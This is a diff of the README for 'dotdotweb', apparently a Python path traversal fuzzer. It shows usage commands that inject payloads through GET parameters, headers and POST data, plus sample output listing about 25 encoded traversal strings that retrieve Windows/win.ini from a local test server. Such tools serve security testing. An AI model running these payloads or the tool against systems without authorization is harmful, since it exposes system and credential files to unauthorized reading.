@@ -1,8 +1,10 @@
 dotdotfarm
 ==========
+![Version](https://img.shields.io/badge/version-1.4.0-blue)
+
 Utility for detection & exploitation of Path Traversal vulnerabilities in various network services
 
-dotdotweb - PT tool for web services (HTTP) (Alpha version)
+dotdotweb - PT tool for HTTP services
 
 Tools are written in Python with using asyncio requests (aiohttp) with some acceleration techniques, which allows you to make **~3K requests per second**
 
@@ -25,7 +27,8 @@ python setup.py install
 Usage
 =====
 ```bash
-usage: dotdotweb.py [-h] [-o {windows,linux}] [-D DEPTH] [-t TIMEOUT] [-f FILE] [-R] [-fs FS] [-fc FC] [-H HEADERS] [-d DATA]
+usage: dotdotweb.py [-h] [-o {windows,linux}] [-D DEPTH] [-t TIMEOUT]
+                    [-f FILE] [-R] [-fs FS] [-fc FC] [-H HEADERS] [-d DATA]
                     [-m {get,post,put,trace,delete}]
                     url
 
@@ -56,21 +59,24 @@ Passing in GET parameters
 ----------------------
 Passing brute parameters via `?par=val` pairs:
 ```bash
-dotdotweb -o windows -fc 500 http://someserver.com:1280/newpath?testparameter=FUZZ&secondparameter=somevalue
+dotdotweb -o windows -fc 500 \ 
+          http://someserver.com:1280/newpath?testparameter=FUZZ&secondparameter=somevalue
 ```
 
 Passing via headers
 -------------------
 Passing brute parameters via `Origin: master=FUZZ` pairs:
 ```bash
-dotdotweb -o linux -fc 500,404 -H "Referer: https://www.google.com/path?q=FUZZ" http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
+dotdotweb -o linux -fc 500,404 -H "Referer: https://www.google.com/path?q=FUZZ" \
+          http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
 ```
 
 Passing via POST data
 ---------------------
 Passing brute parameters via POST data parameters
 ```bash
-dotdotweb -o linux -fc 500 -fs 111 -d "key0=val0&key1=val1" http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
+dotdotweb -o linux -fc 500 -fs 111 -d "key0=val0&key1=val1" \
+          http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
 ```
 
 Example output
@@ -86,32 +92,32 @@ dotdotweb -o windows "http://localhost:8080/pathtrav?query=FUZZ"
      \/                \/                       \/            \/
 
 [*] Started at Sun Jan 22 19:32:46 2023
- ../../../Windows/win.ini                                                       [Status: 200, Size: 111]
- ../Windows/win.ini                                                             [Status: 200, Size: 111]
- ..\Windows\win.ini                                                             [Status: 200, Size: 111]
- ..%2fWindows%2fwin.ini                                                         [Status: 200, Size: 111]
- ..\..\..\Windows\win.ini                                                       [Status: 200, Size: 111]
- ..%5c..%5c..%5cWindows%5cwin.ini                                               [Status: 200, Size: 111]
- ..%5cWindows%5cwin.ini                                                         [Status: 200, Size: 111]
- .%2e/Windows/win.ini                                                           [Status: 200, Size: 111]
- .%2e\Windows\win.ini                                                           [Status: 200, Size: 111]
- .%2e%2fWindows%2fwin.ini                                                       [Status: 200, Size: 111]
- .%2e%5cWindows%5cwin.ini                                                       [Status: 200, Size: 111]
- %5C..%5cWindows%5cwin.ini                                                      [Status: 200, Size: 111]
- f%5C..%2fWindows%2fwin.ini                                                     [Status: 200, Size: 111]
- %5C../Windows/win.ini                                                          [Status: 200, Size: 111]
- %5C..\%5C..\%5C..\Windows\win.ini                                              [Status: 200, Size: 111]
- .%2e\.%2e\.%2e\Windows\win.ini                                                 [Status: 200, Size: 111]
- .%2e%5c.%2e%5c.%2e%5cWindows%5cwin.ini                                         [Status: 200, Size: 111]
- %5C..%2f%5C..%2f%5C..%2fWindows%2fwin.ini                                      [Status: 200, Size: 111]
- %5C../%5C../%5C../Windows/win.ini                                              [Status: 200, Size: 111]
- %5C..%5c%5C..%5c%5C..%5cWindows%5cwin.ini                                      [Status: 200, Size: 111]
- %2e./Windows/win.ini                                                           [Status: 200, Size: 111]
- %2e./%2e./%2e./Windows/win.ini                                                 [Status: 200, Size: 111]
- %2e.%5cWindows%5cwin.ini                                                       [Status: 200, Size: 111]
- %2e.%5c%2e.%5c%2e.%5cWindows%5cwin.ini                                         [Status: 200, Size: 111]
- .%2e%2f.%2e%2f.%2e%2fWindows%2fwin.ini                                         [Status: 200, Size: 111]
-100%|██████████████████████████████████████████████████████████████| 6960/6960 [00:12<00:00, 575.63it/s]
+ ../../../Windows/win.ini                                                   [Status: 200, Size: 111]
+ ../Windows/win.ini                                                         [Status: 200, Size: 111]
+ ..\Windows\win.ini                                                         [Status: 200, Size: 111]
+ ..%2fWindows%2fwin.ini                                                     [Status: 200, Size: 111]
+ ..\..\..\Windows\win.ini                                                   [Status: 200, Size: 111]
+ ..%5c..%5c..%5cWindows%5cwin.ini                                           [Status: 200, Size: 111]
+ ..%5cWindows%5cwin.ini                                                     [Status: 200, Size: 111]
+ .%2e/Windows/win.ini                                                       [Status: 200, Size: 111]
+ .%2e\Windows\win.ini                                                       [Status: 200, Size: 111]
+ .%2e%2fWindows%2fwin.ini                                                   [Status: 200, Size: 111]
+ .%2e%5cWindows%5cwin.ini                                                   [Status: 200, Size: 111]
+ %5C..%5cWindows%5cwin.ini                                                  [Status: 200, Size: 111]
+ f%5C..%2fWindows%2fwin.ini                                                 [Status: 200, Size: 111]
+ %5C../Windows/win.ini                                                      [Status: 200, Size: 111]
+ %5C..\%5C..\%5C..\Windows\win.ini                                          [Status: 200, Size: 111]
+ .%2e\.%2e\.%2e\Windows\win.ini                                             [Status: 200, Size: 111]
+ .%2e%5c.%2e%5c.%2e%5cWindows%5cwin.ini                                     [Status: 200, Size: 111]
+ %5C..%2f%5C..%2f%5C..%2fWindows%2fwin.ini                                  [Status: 200, Size: 111]
+ %5C../%5C../%5C../Windows/win.ini                                          [Status: 200, Size: 111]
+ %5C..%5c%5C..%5c%5C..%5cWindows%5cwin.ini                                  [Status: 200, Size: 111]
+ %2e./Windows/win.ini                                                       [Status: 200, Size: 111]
+ %2e./%2e./%2e./Windows/win.ini                                             [Status: 200, Size: 111]
+ %2e.%5cWindows%5cwin.ini                                                   [Status: 200, Size: 111]
+ %2e.%5c%2e.%5c%2e.%5cWindows%5cwin.ini                                     [Status: 200, Size: 111]
+ .%2e%2f.%2e%2f.%2e%2fWindows%2fwin.ini                                     [Status: 200, Size: 111]
+100%|██████████████████████████████████████████████████████████| 6960/6960 [00:12<00:00, 575.63it/s]
 [*] Ended at Sun Jan 22 19:32:58 2023 (11 seconds)
 ```
 
